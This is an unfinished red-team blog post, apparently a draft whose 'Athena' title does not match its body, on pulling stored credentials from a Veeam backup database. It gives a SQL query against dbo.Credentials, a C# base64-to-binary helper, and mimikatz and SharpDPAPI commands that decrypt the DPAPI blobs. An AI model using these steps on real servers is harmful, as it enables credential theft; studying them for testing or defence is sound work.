---
title: "Crossplatform operations with Athena"
categories:
  - Red Team
  - C2
tags:
  - Instructional
  - Malware
  - C#
  - Operations
---

UNDER CONSTRUCTION



## What is VEEAM?

## So what?
- Domain Credentials
- Local Credentials
- Linux Credentials
- SSH Private Keys
- AWS/GCP Access Keys
- Azure Computer Account Credentials
- Azure Storage Account Credentials
![image](https://user-images.githubusercontent.com/26147220/121399946-fc125e80-c924-11eb-8562-207e7a331fbc.png)

![image](https://user-images.githubusercontent.com/26147220/121400943-2b759b00-c926-11eb-9fe7-f806a0dffc62.png)

Hitting "Next" will attempt to connect to the database to validate connnectivity 
![image](https://user-images.githubusercontent.com/26147220/121401612-e56d0700-c926-11eb-8c19-33029d4c1c98.png)

There are two ways you can pull the credential information from the database. The first is to navigate to the VeeamBackup database and look for the credentials table. It's easy to find as it's just named "dbo.Credentials". Alternatively we can run the following SQL Query:

`SELECT user_name,password FROM VeeamBackup.dbo.Credentials;`

After running this query, you'll see the following output:

![image](https://user-images.githubusercontent.com/26147220/121402412-db97d380-c927-11eb-9eaf-58b4c9d55757.png)

Awesome! It looks base64 encoded, let's see if we can decode it!

![image](https://user-images.githubusercontent.com/26147220/121402509-f9653880-c927-11eb-90c2-e284e84b88b1.png)

hmm...not quite.

## Decrypting the Credentials

Looking at the [documentation](https://helpcenter.veeam.com/docs/agentforwindows/configurator/encryption.html?ver=50), we can see the user credentials get encrypted before they're stored into the database. Unfortunately, it doesn't show us the type of encryption that is being used to protect these passwords.

After some further googling, I came across the following KB article [KB2327](https://www.veeam.com/kb2327) which states:

```
All sensitive information, such as user credentials and encryption keys are stored in the configuration database are encrypted with machine-specific private key of backup server. 
Accordingly, a newly installed backup server will not be able to decrypt such information if attached to the existing database.
```

```
using System;

namespace txt2bin
{
    class Program
    {
        static void Main(string[] args)
        {
            string dpapistring = "blobstringgoeshere";

            byte[] data = Convert.FromBase64String(dpapistring);

            System.IO.File.WriteAllBytes("payload.bin", data);
        }
    }
}
```

`dpapi::blob /in:"C:\path\to\payload.bin" /unprotect `

`SharpDPAPI.exe blob /target:"base64blobgoeshere" /unprotect`
